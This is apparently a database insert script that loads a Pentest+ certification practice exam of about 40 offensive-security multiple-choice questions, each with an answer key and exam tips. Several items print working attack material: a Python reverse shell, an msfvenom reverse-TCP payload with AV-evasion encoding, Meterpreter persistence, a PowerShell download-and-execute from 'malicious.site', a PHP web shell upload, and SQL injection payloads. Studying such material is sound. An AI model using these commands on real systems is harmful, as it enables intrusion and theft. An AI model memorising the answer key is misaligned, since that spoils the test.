db.tests.insertOne({
  "category": "penplus",
  "testId": 9,
  "testName": "Pentest+ Practice Test #9 (Ruthless)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "Analyze the following Nmap scan output and determine the MOST effective follow-up action:\n\n```\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n80/tcp   open  http       Apache httpd 2.4.38 ((Debian))\n139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\nWhich next step MOST likely leads to a successful initial foothold?",
      "options": [
        "Attempt SMB null session enumeration to gather user credentials.",
        "Perform a brute-force SSH attack using default credential sets.",
        "Enumerate Apache modules for potential remote code execution (RCE).",
        "Launch a Samba trans2open exploit targeting CVE-2017-7494."
      ],
      "correctAnswerIndex": 3,
      "explanation": "CVE-2017-7494 affects Samba services, allowing remote code execution via a crafted SMB request. Given the Samba version details, exploiting this known vulnerability is the most efficient next step.",
      "examTip": "Always correlate service versions with known CVEs. Older Samba versions are prime RCE targets."
    },
    {
      "id": 2,
      "question": "Review the following Python code snippet designed for credential brute-forcing:\n\n```python\nimport requests\nurl = 'https://targetsite.com/login'\nusernames = ['admin', 'user', 'test']\npasswords = ['123456', 'password', 'admin']\n\nfor user in usernames:\n    for pwd in passwords:\n        response = requests.post(url, data={'username': user, 'password': pwd})\n        if 'Welcome' in response.text:\n            print(f'Success: {user}:{pwd}')\n        else:\n            print(f'Failed: {user}:{pwd}')\n```\n\nWhat improvement MOST significantly enhances this script's stealth during a penetration test?",
      "options": [
        "Implement exponential backoff after failed attempts to evade rate-limiting defenses.",
        "Use random User-Agent strings in the HTTP header to avoid signature-based detection.",
        "Add proxy rotation support to bypass IP-based blocking mechanisms.",
        "Incorporate multi-threading to complete the brute-force attack faster."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Exponential backoff slows repeated attempts, reducing the likelihood of triggering automated defenses like WAF rate-limiting.",
      "examTip": "Stealth over speed: Adjust timing to mimic human behavior during brute-force attacks."
    },
    {
      "id": 3,
      "question": "Given the Burp Suite HTTP request below, which parameter is MOST likely vulnerable to SQL injection?\n\n```\nPOST /login HTTP/1.1\nHost: victim.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=pass123&redirect=home\n```\n\nWhich payload would BEST confirm the vulnerability?",
      "options": [
        "' OR '1'='1';-- ",
        "admin' -- ",
        "1' OR '1'='1' LIMIT 1; -- ",
        "' UNION SELECT null, version(); -- "
      ],
      "correctAnswerIndex": 3,
      "explanation": "A UNION-based SQL injection test with `SELECT null, version();` can reveal backend database details, confirming SQLi vulnerability and providing system insights.",
      "examTip": "UNION-based payloads can leak DBMS version details—critical for tailoring subsequent exploits."
    },
    {
      "id": 4,
      "question": "Examine the partial Metasploit output below:\n\n```\n[*] Started reverse TCP handler on 192.168.1.10:4444 \n[*] Sending stage (985320 bytes) to 192.168.1.25\n[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.25:51342) at 2025-02-23 14:32:00 +0000\n```\n\nWhich command should be issued NEXT to ensure persistent access after reboot?",
      "options": [
        "run persistence -U -i 5 -p 4444 -r 192.168.1.10",
        "background && sessions -l",
        "run post/windows/manage/migrate",
        "run hashdump"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`run persistence` establishes a startup script ensuring Meterpreter re-establishes the session post-reboot, maintaining long-term access.",
      "examTip": "Persistence first: Ensure you don’t lose access after system reboot before further exploration."
    },
    {
      "id": 5,
      "question": "Log snippet from a compromised web server:\n\n```\n192.168.1.105 - - [23/Feb/2025:14:15:00 +0000] \"POST /upload HTTP/1.1\" 200 -\n192.168.1.105 - - [23/Feb/2025:14:15:03 +0000] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 -\n192.168.1.105 - - [23/Feb/2025:14:15:05 +0000] \"GET /uploads/shell.php?cmd=uname -a HTTP/1.1\" 200 -\n```\n\nWhat vulnerability MOST likely led to the successful exploitation of this web server?",
      "options": [
        "Unrestricted file upload vulnerability",
        "Server-side template injection (SSTI)",
        "Remote code execution (RCE) via deserialization flaw",
        "Directory traversal enabling arbitrary file access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The ability to upload a `.php` file and execute system commands (`id`, `uname -a`) strongly suggests an unrestricted file upload vulnerability.",
      "examTip": "File upload paths should always be validated—execution permissions on uploaded files lead directly to RCE."
    },
    {
      "id": 6,
      "question": "You intercepted the following network traffic using Wireshark:\n\n```\nPOST /api/auth HTTP/1.1\nHost: app.internal.local\nContent-Type: application/json\n\n{\n  \"username\": \"admin\",\n  \"password\": \"cGFzc3dvcmQxMjM=\"\n}\n```\n\nWhat is the MOST likely vulnerability present based on the captured payload?",
      "options": [
        "Cleartext credentials transmission without proper encryption",
        "Base64-encoded credentials vulnerable to easy decoding",
        "JWT token exposure due to missing signature verification",
        "Improper session management allowing replay attacks"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The password `cGFzc3dvcmQxMjM=` is Base64-encoded, not encrypted. Base64 is easily decoded, exposing the password if intercepted.",
      "examTip": "Base64 ≠ encryption. Always check for proper encryption (e.g., TLS) during credential transmission."
    },
    {
      "id": 7,
      "question": "Given the following command run during reconnaissance:\n\n```\nnmap -p- -sV -T4 --script=http-enum target.com\n```\n\nWhich finding would MOST likely guide your next exploitation step?",
      "options": [
        "Identified Apache Tomcat Manager at /manager/html",
        "HTTP header disclosing server version: Apache/2.4.41",
        "Open port 8080 running a Java-based web application",
        "Presence of X-Powered-By: PHP/7.3.11 in HTTP response"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Apache Tomcat Manager at `/manager/html` is often a high-value target due to potential weak credentials, leading to remote code execution (RCE).",
      "examTip": "Focus on management interfaces—often poorly secured and ripe for RCE."
    },
    {
      "id": 8,
      "question": "Analyze the following Python payload intended for reverse shell delivery:\n\n```python\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.10.10.5\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])\n```\n\nWhich EDR detection technique is MOST likely to detect this payload?",
      "options": [
        "Behavioral analysis detecting unusual socket connections",
        "Static code analysis flagging subprocess usage patterns",
        "Signature-based detection due to known reverse shell code",
        "Heuristic analysis based on command-line activity anomalies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Behavioral analysis will detect suspicious socket connections to uncommon ports combined with shell spawning—classic reverse shell behavior.",
      "examTip": "Behavioral EDR solutions focus on *what* the code does, not just *how* it looks."
    },
    {
      "id": 9,
      "question": "A penetration tester executes the following command:\n\n```\nsqlmap -u \"http://victim.com/login.php?user=admin\" --dbs --batch\n```\n\nGiven the output:\n\n```\navailable databases [2]:\n[*] information_schema\n[*] employees_db\n```\n\nWhat should be the tester’s NEXT action for maximum data extraction efficiency?",
      "options": [
        "Run sqlmap with `--tables -D employees_db` to enumerate tables.",
        "Leverage `--dump -D employees_db` to extract all data immediately.",
        "Execute `--columns -D employees_db -T users` after identifying key tables.",
        "Re-run the scan with `--risk=3 --level=5` for deeper assessment."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Enumerating tables (`--tables`) is the logical next step after identifying available databases, helping focus on high-value data like user credentials.",
      "examTip": "Don’t dump blindly. Structure your enumeration for efficient, targeted data extraction."
    },
    {
      "id": 10,
      "question": "Which Kerberos attack involves forging a ticket-granting service (TGS) ticket without access to service account credentials, assuming knowledge of the service principal name (SPN)?",
      "options": [
        "Silver Ticket Attack",
        "Golden Ticket Attack",
        "Pass-the-Ticket Attack",
        "Overpass-the-Hash Attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Silver Ticket attacks involve forging TGS tickets, providing access to specific services without communicating with the domain controller.",
      "examTip": "Silver = specific service access. Golden = full domain control. Know the difference!"
    },
    {
      "id": 11,
      "question": "Review the BloodHound output snippet:\n\n```\nUser: svc_backup\nPrivileged group memberships: Backup Operators\nEffective admin rights on: 3 hosts\nPossible attack paths:\n- RBCD attack via unconstrained delegation\n- Kerberoasting with vulnerable SPNs\n```\n\nWhich attack path provides the MOST direct route to domain dominance?",
      "options": [
        "Performing a Kerberoasting attack against vulnerable SPNs",
        "Executing a Resource-Based Constrained Delegation (RBCD) attack",
        "Conducting Pass-the-Hash attacks from compromised hosts",
        "Leveraging backup operator privileges for NTDS.dit extraction"
      ],
      "correctAnswerIndex": 1,
      "explanation": "RBCD attacks allow attackers to impersonate domain administrators without requiring DA credentials, providing a direct path to domain dominance.",
      "examTip": "RBCD = impersonation at scale. A shortcut to domain admin without cracking hashes."
    },
    {
      "id": 12,
      "question": "A penetration tester accesses AWS metadata via the following command:\n\n```\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n\nThe response includes:\n\n```\n{\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"...\",\n  \"Expiration\": \"2025-02-24T16:00:00Z\"\n}\n```\n\nWhich action MOST effectively escalates privileges in this scenario?",
      "options": [
        "Use Pacu to enumerate IAM roles and escalate privileges via privilege escalation modules.",
        "Leverage AWS CLI with the captured credentials to list all S3 buckets.",
        "Test for permissions to assume higher-privilege roles via sts:AssumeRole calls.",
        "Attempt Lambda function injections to run arbitrary code under higher permissions."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pacu’s privilege escalation modules automate IAM role enumeration and privilege escalation, providing the most direct path to broader access.",
      "examTip": "Metadata ≠ endgame. Use specialized tools like Pacu for rapid privilege escalation analysis in AWS."
    },
    {
      "id": 13,
      "question": "Given the following `msfvenom` command:\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe\n```\n\nWhat is the PRIMARY purpose of the `-e x86/shikata_ga_nai -i 5` parameters?",
      "options": [
        "To obfuscate the payload by encoding it multiple times to evade antivirus detection.",
        "To compress the payload for faster transfer and execution.",
        "To ensure payload compatibility across different Windows architectures.",
        "To sign the payload digitally, bypassing application whitelisting."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `x86/shikata_ga_nai` encoder obfuscates payloads to evade signature-based AV detection, with `-i 5` specifying five iterations of encoding.",
      "examTip": "Payload obfuscation is critical—multiple encoding passes increase stealth."
    },
    {
      "id": 14,
      "question": "A tester uses the following Responder command:\n\n```\nresponder -I eth0 -wrf\n```\n\nWhich outcome BEST describes the result of this command during a network penetration test?",
      "options": [
        "Captures NTLMv2 hashes from SMB, HTTP, and LDAP requests for offline cracking.",
        "Performs LLMNR and NetBIOS poisoning to redirect traffic to the attacker's host.",
        "Executes SMB relay attacks automatically, exploiting authentication mishandling.",
        "Spoofs DNS responses to reroute victim traffic to a rogue web server."
      ],
      "correctAnswerIndex": 0,
      "explanation": "With the `-wrf` flags, Responder captures NTLMv2 hashes from multiple protocols for offline cracking, supporting multi-vector credential harvesting.",
      "examTip": "NTLMv2 hashes + offline cracking = quick lateral movement opportunities. Responder makes it easy."
    },
    {
      "id": 15,
      "question": "A penetration tester encounters the following web application behavior:\n\n- The application uses JWTs for authentication.\n- The JWT header specifies `\"alg\": \"none\"`.\n- Submitting a modified JWT with `\"alg\": \"none\"` and an empty signature grants admin access.\n\nWhich security flaw has been exploited?",
      "options": [
        "JWT algorithm confusion vulnerability",
        "Insufficient token expiration handling",
        "Lack of token audience (`aud`) validation",
        "Session fixation through insecure JWT storage"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Specifying `\"alg\": \"none\"` bypasses signature validation in improperly configured JWT libraries, allowing privilege escalation (algorithm confusion).",
      "examTip": "Always enforce server-side signature validation—`alg: none` should never be accepted."
    },
    {
      "id": 16,
      "question": "While reviewing logs after a penetration test, the following pattern emerges:\n\n```\nGET /api/user?id=1 UNION SELECT null, password FROM users; -- \nGET /api/user?id=1' OR '1'='1'; -- \nGET /api/user?id=1; DROP TABLE users; -- \n```\n\nWhat is the MOST appropriate remediation to recommend to the client?",
      "options": [
        "Implement prepared statements with parameterized queries.",
        "Configure a WAF with SQL injection detection signatures.",
        "Use stored procedures for all database interactions.",
        "Enable verbose logging to detect future injection attempts."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Prepared statements with parameterized queries prevent SQL injection by separating code from data, rendering injection attempts ineffective.",
      "examTip": "SQL injection prevention = parameterized queries. Defense starts at the code level."
    },
    {
      "id": 17,
      "question": "A penetration tester is analyzing an IoT device that communicates over MQTT without authentication. What attack MOST effectively compromises the device?",
      "options": [
        "Publishing malicious payloads to subscribed topics, triggering device actions.",
        "Performing a replay attack by resending captured MQTT messages.",
        "Flooding the broker with messages, causing denial of service (DoS).",
        "Sniffing MQTT traffic for sensitive data in transit over unsecured channels."
      ],
      "correctAnswerIndex": 0,
      "explanation": "MQTT brokers without authentication allow attackers to publish commands to topics the device subscribes to, potentially executing malicious actions.",
      "examTip": "MQTT without authentication = open door. Control the topic, control the device."
    },
    {
      "id": 18,
      "question": "Examine the following Kubernetes manifest snippet:\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: sensitive-pod\nspec:\n  containers:\n  - name: web\n    image: nginx\n    securityContext:\n      privileged: true\n```\n\nWhat security risk does this configuration MOST likely introduce?",
      "options": [
        "Allows host-level access, potentially enabling container breakout.",
        "Exposes the pod to Denial of Service (DoS) via resource exhaustion.",
        "Permits privilege escalation through default service accounts.",
        "Weakens network segmentation by enabling inter-pod communication."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Setting `privileged: true` allows the container access to host-level resources, which can enable attackers to escape the container and compromise the host.",
      "examTip": "Privileged containers = host compromise risk. Always enforce least privilege."
    },
    {
      "id": 19,
      "question": "A penetration tester executes:\n\n```\nnetcat -lvp 4444\n```\n\nWhat is the MOST likely objective of this action?",
      "options": [
        "Listening for incoming reverse shell connections on port 4444.",
        "Establishing a bind shell for remote access to the local host.",
        "Port scanning the target network for open TCP connections.",
        "Setting up a relay service for man-in-the-middle (MitM) attacks."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`netcat -lvp 4444` listens (`-l`) verbosely (`-v`) on port 4444 (`-p`), typically awaiting a reverse shell connection.",
      "examTip": "Reverse shells connect *to* the attacker; bind shells require the attacker to connect *to* the target."
    },
    {
      "id": 20,
      "question": "Given the following AWS CLI output:\n\n```\n{\n    \"UserName\": \"tempAdmin\",\n    \"AttachedPolicies\": [\n        {\"PolicyName\": \"AdministratorAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"}\n    ]\n}\n```\n\nWhich remediation MOST effectively prevents privilege escalation using temporary credentials?",
      "options": [
        "Enforce strict IAM role trust policies with explicit conditions.",
        "Rotate all associated access keys and invalidate active sessions.",
        "Restrict sts:AssumeRole permissions to verified principals only.",
        "Apply service control policies (SCPs) to limit administrative actions."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Restricting `sts:AssumeRole` permissions ensures temporary credentials cannot be used to escalate privileges across accounts.",
      "examTip": "In AWS, `sts:AssumeRole` controls lateral movement—lock it down to prevent escalation."
    },
    {
      "id": 21,
      "question": "Review the following Python code used for JWT token manipulation:\n\n```python\nimport jwt\npayload = {\"user\":\"admin\", \"role\":\"admin\"}\nencoded = jwt.encode(payload, None, algorithm='none')\nprint(encoded)\n```\n\nWhat vulnerability does this exploit MOST likely demonstrate?",
      "options": [
        "JWT algorithm confusion vulnerability, bypassing signature verification.",
        "Exposure of symmetric key values through insecure token handling.",
        "Privilege escalation due to missing audience (`aud`) claims.",
        "Cross-site scripting (XSS) via JWT payload manipulation."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Using `algorithm='none'` bypasses signature verification in misconfigured JWT libraries, allowing privilege escalation (algorithm confusion).",
      "examTip": "JWT `alg: none` = no validation. Always enforce signature checks on the server side."
    },
    {
      "id": 22,
      "question": "A penetration tester captures the following Kerberos traffic:\n\n```\nAS-REQ cname: attacker@domain.local sname: krbtgt/domain.local\nAS-REP enc-part: [RC4-HMAC]\n```\n\nWhich attack technique does this MOST likely represent?",
      "options": [
        "AS-REP roasting attack to crack user credentials offline.",
        "Kerberoasting attack targeting service principal names (SPNs).",
        "Pass-the-Ticket (PtT) attack using stolen TGTs.",
        "Overpass-the-Hash attack to gain lateral movement access."
      ],
      "correctAnswerIndex": 0,
      "explanation": "AS-REP roasting exploits user accounts not requiring pre-authentication, allowing offline cracking of the `AS-REP` response encrypted with the user's key.",
      "examTip": "AS-REP roast = no pre-auth users. Offline hash cracking leads to easy access."
    },
    {
      "id": 23,
      "question": "Given this snippet from a web server’s access logs:\n\n```\n192.168.1.100 - - [24/Feb/2025:12:00:00 +0000] \"GET /app.php?file=../../../../etc/passwd HTTP/1.1\" 200 -\n```\n\nWhat is the MOST likely vulnerability being exploited?",
      "options": [
        "Directory traversal vulnerability allowing unauthorized file access.",
        "Remote file inclusion (RFI) leading to server-side code execution.",
        "Path disclosure through improper server configuration.",
        "Insecure direct object reference (IDOR) exposing sensitive files."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `../../../../etc/passwd` pattern is indicative of a directory traversal attack, aiming to access files outside the web root.",
      "examTip": "Look for `../` patterns—classic directory traversal indicators."
    },
    {
      "id": 24,
      "question": "A penetration tester identifies the following open ports on a target:\n\n```\nPORT    STATE SERVICE\n21/tcp  open  ftp\n22/tcp  open  ssh\n80/tcp  open  http\n3306/tcp open mysql\n```\n\nWhich attack path offers the MOST direct route to remote code execution (RCE)?",
      "options": [
        "Test FTP for anonymous access leading to web directory upload.",
        "Enumerate MySQL for default credentials allowing shell execution.",
        "Attempt SSH brute force against known default accounts.",
        "Probe HTTP for file upload functionality and code injection."
      ],
      "correctAnswerIndex": 1,
      "explanation": "MySQL with default credentials can often lead to RCE via user-defined functions (UDFs), providing shell access with minimal resistance.",
      "examTip": "Database servers + default creds = fast RCE. Always check for this low-hanging fruit."
    },
    {
      "id": 25,
      "question": "Analyze the following output from `kube-hunter`:\n\n```\nVULNERABILITY: Dashboard Exposed Without Authentication\nSEVERITY: HIGH\nDESCRIPTION: Kubernetes dashboard is accessible without authentication.\nLOCATION: http://192.168.1.120:8001/api/v1/namespaces/kube-system/services/kubernetes-dashboard/proxy/\n```\n\nWhich action should the tester take NEXT to achieve cluster-level compromise?",
      "options": [
        "Access the dashboard and deploy a malicious pod with hostPath volume mounts.",
        "Modify cluster role bindings to escalate privileges to cluster-admin.",
        "Enumerate secrets stored in the kube-system namespace for credentials.",
        "Scan for exposed etcd endpoints to manipulate cluster state data."
      ],
      "correctAnswerIndex": 0,
      "explanation": "An unauthenticated Kubernetes dashboard allows attackers to deploy pods with elevated privileges, enabling full cluster compromise via hostPath mounts.",
      "examTip": "K8s dashboard without auth? Deploy a pod with hostPath mounts—instant cluster takeover."
    },
    {
      "id": 26,
      "question": "A penetration tester discovers the following HTTP response:\n\n```\nHTTP/1.1 200 OK\nSet-Cookie: sessionid=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9...;\n```\n\nWhich attack MOST effectively compromises user sessions in this context?",
      "options": [
        "JWT brute force due to weak HMAC-SHA256 secrets.",
        "Session fixation by forcing clients to reuse the attacker’s token.",
        "Cross-site request forgery (CSRF) exploiting insufficient validation.",
        "Cross-site scripting (XSS) to steal session tokens from victim browsers."
      ],
      "correctAnswerIndex": 0,
      "explanation": "If HMAC-SHA256 secrets are weak, attackers can brute-force the JWT signature, enabling them to forge valid tokens and hijack user sessions.",
      "examTip": "Weak JWT secrets = open door to session hijacking. Strong keys are a must."
    },
    {
      "id": 27,
      "question": "While analyzing a Windows host, a penetration tester runs the following command:\n\n```\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections\n```\n\nThe output is:\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\n    fDenyTSConnections    REG_DWORD    0x1\n```\n\nWhat does this finding MOST likely indicate?",
      "options": [
        "Remote Desktop Protocol (RDP) connections are currently disabled.",
        "Terminal Services are configured to allow unrestricted RDP access.",
        "RDP access is restricted but can be enabled by editing registry keys.",
        "The system is vulnerable to RDP-based credential brute-force attacks."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`fDenyTSConnections` set to `0x1` means RDP connections are currently denied. Changing this to `0x0` enables RDP access.",
      "examTip": "Check registry keys for quick remote access wins—`fDenyTSConnections` is key for RDP."
    },
    {
      "id": 28,
      "question": "A tester intercepts the following request using Burp Suite:\n\n```\nPOST /api/upload HTTP/1.1\nHost: vulnerableapp.local\nContent-Type: multipart/form-data; boundary=---12345\n\n-----12345\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n-----12345--\n```\n\nWhat is the MOST likely result if the application lacks proper validation?",
      "options": [
        "Remote code execution (RCE) by executing OS commands through the web shell.",
        "Directory traversal leading to unauthorized file access on the server.",
        "Server-side request forgery (SSRF) enabling internal network scanning.",
        "SQL injection allowing direct access to the backend database."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The uploaded `shell.php` file executes OS commands provided via the `cmd` parameter, enabling RCE if executed by the web server.",
      "examTip": "File uploads = RCE risk. Always validate file types and block executable code uploads."
    },
    {
      "id": 29,
      "question": "A penetration tester discovers the following entry in a `.git/config` file on a public web server:\n\n```\n[remote \"origin\"]\n    url = https://username:password@github.com/org/repo.git\n```\n\nWhich risk does this MOST likely represent?",
      "options": [
        "Credential leakage enabling unauthorized repository access.",
        "Exposure of private API keys, risking third-party integrations.",
        "Injection point for malicious Git hooks leading to RCE.",
        "Privilege escalation by modifying Git submodule configurations."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hardcoded credentials in Git configuration files expose repository access, potentially leaking source code and sensitive data.",
      "examTip": "Credentials in config files = immediate compromise. Always scrub sensitive data from repos."
    },
    {
      "id": 30,
      "question": "A penetration tester intercepts the following WebSocket traffic:\n\n```\nGET /ws/chat HTTP/1.1\nHost: chatapp.local\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13\n```\n\nWhich attack would MOST likely exploit this WebSocket implementation?",
      "options": [
        "Cross-Site WebSocket Hijacking (CSWSH)",
        "Cross-Site Request Forgery (CSRF)",
        "Cross-Site Scripting (XSS)",
        "WebSocket protocol downgrade attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "CSWSH allows attackers to hijack WebSocket connections if proper origin checks are missing, leading to unauthorized access or actions.",
      "examTip": "WebSockets need strict origin checks—CSWSH exploits trust without them."
    },
    {
      "id": 31,
      "question": "Analyze the following `nmap` output:\n\n```\nPORT     STATE SERVICE    VERSION\n5900/tcp open  vnc         VNC (protocol 3.3)\n```\n\nWhat is the MOST critical next step in attempting exploitation?",
      "options": [
        "Attempt VNC authentication bypass for unauthenticated access.",
        "Launch brute-force attacks against VNC credentials.",
        "Conduct port forwarding to pivot into the internal network.",
        "Exploit known buffer overflow vulnerabilities in VNC 3.3."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Older VNC protocols (like 3.3) often lack proper authentication mechanisms, enabling attackers to bypass authentication for direct access.",
      "examTip": "Always test for default or missing authentication first—quickest route to control."
    },
    {
      "id": 32,
      "question": "A tester runs the following Metasploit command:\n\n```\nuse exploit/multi/http/struts2_content_type_ognl\nset RHOSTS target.local\nset RPORT 8080\nrun\n```\n\nWhich vulnerability is being exploited in this scenario?",
      "options": [
        "Apache Struts 2 OGNL injection leading to RCE.",
        "Command injection vulnerability in HTTP headers.",
        "Deserialization attack in Apache Tomcat services.",
        "Directory traversal exploit via Content-Type header."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The specified module targets Apache Struts 2 vulnerabilities related to OGNL expression injection, enabling RCE.",
      "examTip": "Struts2 OGNL = RCE goldmine. Header-based injection is a top exploit route."
    },
    {
      "id": 33,
      "question": "Review the following BloodHound finding:\n\n```\nEdge: GenericAll\nSource: svc_account\nTarget: DOMAIN\\Domain Admins\n```\n\nWhat is the MOST effective exploitation path based on this information?",
      "options": [
        "Abuse GenericAll permissions to add the svc_account to Domain Admins.",
        "Perform Pass-the-Hash attacks from svc_account sessions.",
        "Use RBCD techniques to impersonate Domain Admin users.",
        "Attempt Kerberoasting against the svc_account SPN."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`GenericAll` permission grants full control, allowing the attacker to add themselves or other accounts to privileged groups like Domain Admins.",
      "examTip": "GenericAll = full control. Immediate escalation to Domain Admin—no extra tools needed."
    },
    {
      "id": 34,
      "question": "Analyze the following PowerShell script:\n\n```powershell\nInvoke-WebRequest -Uri \"http://malicious.site/payload.exe\" -OutFile \"C:\\Users\\Public\\payload.exe\"\nStart-Process \"C:\\Users\\Public\\payload.exe\"\n```\n\nWhich EDR detection technique would MOST likely trigger on this activity?",
      "options": [
        "Command-line behavior analysis detecting suspicious downloads and execution.",
        "Heuristic analysis recognizing known malicious domains.",
        "Signature-based detection on `payload.exe` content hash.",
        "Network traffic inspection identifying connections to known bad IPs."
      ],
      "correctAnswerIndex": 0,
      "explanation": "EDR solutions frequently monitor for suspicious PowerShell commands involving downloads followed by immediate execution, a common malware behavior.",
      "examTip": "Download + execute in PowerShell? EDRs flag this as suspicious activity instantly."
    },
    {
      "id": 35,
      "question": "A penetration tester reviews Wireshark captures and identifies the following traffic:\n\n```\nFrame 1: 112 bytes on wire\nHypertext Transfer Protocol\n    GET /app/login HTTP/1.1\n    Host: target.local\n    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\n```\n\nWhat is the MOST appropriate exploitation step following this observation?",
      "options": [
        "Decode the Base64-encoded credentials for immediate authentication attempts.",
        "Perform session hijacking using captured authentication cookies.",
        "Launch a replay attack to authenticate without decoding the credentials.",
        "Execute SSL stripping to capture additional plaintext credentials."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`YWRtaW46cGFzc3dvcmQ=` is Base64-encoded (`admin:password`). Decoding provides direct credentials for authentication attempts.",
      "examTip": "Base64 in Basic Auth = plaintext creds. Decode and log in immediately."
    },
    {
      "id": 36,
      "question": "The following Burp Suite intruder payload generated this server response:\n\n```\nHTTP/1.1 500 Internal Server Error\nX-Powered-By: PHP/7.3.11\nWarning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /var/www/html/index.php on line 45\n```\n\nWhat vulnerability is MOST likely present?",
      "options": [
        "SQL injection due to improper input sanitization.",
        "Remote code execution via unsanitized PHP function calls.",
        "Cross-site scripting (XSS) due to unsanitized error messages.",
        "Directory traversal exposure from faulty database queries."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The error indicates that the SQL query failed, often a sign of SQL injection opportunities when proper sanitization is absent.",
      "examTip": "500 errors + database warnings = SQLi hints. Test further with crafted payloads."
    },
    {
      "id": 37,
      "question": "A penetration tester discovers an open Redis service with no authentication required. Which action MOST effectively leads to remote code execution (RCE)?",
      "options": [
        "Write a cron job in `/var/spool/cron/root` to execute a reverse shell payload.",
        "Enumerate existing keys to discover sensitive credentials for lateral movement.",
        "Exploit unsecured replication settings for privilege escalation.",
        "Abuse Redis module loading to inject malicious shared libraries."
      ],
      "correctAnswerIndex": 0,
      "explanation": "By writing malicious cron jobs via Redis, attackers can gain persistent RCE when the cron job executes under root context.",
      "examTip": "Redis + no auth = direct RCE via cron job injection. Low-hanging exploit path."
    },
    {
      "id": 38,
      "question": "A tester discovers an IoT device exposing Telnet without authentication. What is the MOST impactful next step for exploitation?",
      "options": [
        "Connect via Telnet and execute enumeration commands for device takeover.",
        "Launch a brute-force attack using default manufacturer credentials.",
        "Intercept and modify Telnet traffic for command injection opportunities.",
        "Attempt firmware extraction to analyze for hardcoded credentials."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unsecured Telnet services allow immediate access. The tester can connect and execute commands for full device control.",
      "examTip": "Telnet with no auth? Immediate shell access—no brute force required."
    },
    {
      "id": 39,
      "question": "Analyze the following SQLi payload:\n\n```\n' OR 1=1 UNION SELECT username, password FROM users; --\n```\n\nWhich database configuration MOST effectively mitigates this vulnerability?",
      "options": [
        "Implementing prepared statements with parameterized queries.",
        "Restricting database user permissions to read-only access.",
        "Utilizing stored procedures for all database interactions.",
        "Enabling strict mode in the SQL server for query validation."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Prepared statements prevent SQLi by separating code from data, making injected SQL commands ineffective.",
      "examTip": "SQLi defense starts at the code: prepared statements block injection attempts."
    },
    {
      "id": 40,
      "question": "During a wireless penetration test, the following command is executed:\n\n```\naircrack-ng -w passwords.txt -b 00:11:22:33:44:55 capture.cap\n```\n\nWhat is the objective of this command?",
      "options": [
        "Brute-forcing the WPA/WPA2 PSK using a wordlist against a captured handshake.",
        "Performing a deauthentication attack to capture WPA handshakes.",
        "Launching a beacon flood attack to disrupt legitimate wireless connections.",
        "Decrypting captured WEP packets using known initialization vectors."
      ],
      "correctAnswerIndex": 0,
      "explanation": "`aircrack-ng` with `-w` and `-b` targets brute-force cracking of WPA/WPA2 PSK from a previously captured handshake (`capture.cap`).",
      "examTip": "WPA/WPA2 cracking = handshake + wordlist. Aircrack-ng makes this straightforward."
    },
    {
      "id": 41,
      "question": "A tester identifies the following HTTP response header:\n\n```\nHTTP/1.1 200 OK\nX-Frame-Options: ALLOW-FROM https://example.com\n```\n\nWhat security risk does this configuration MOST likely introduce?",
      "options": [
        "Clickjacking attacks from malicious framing on allowed domains.",
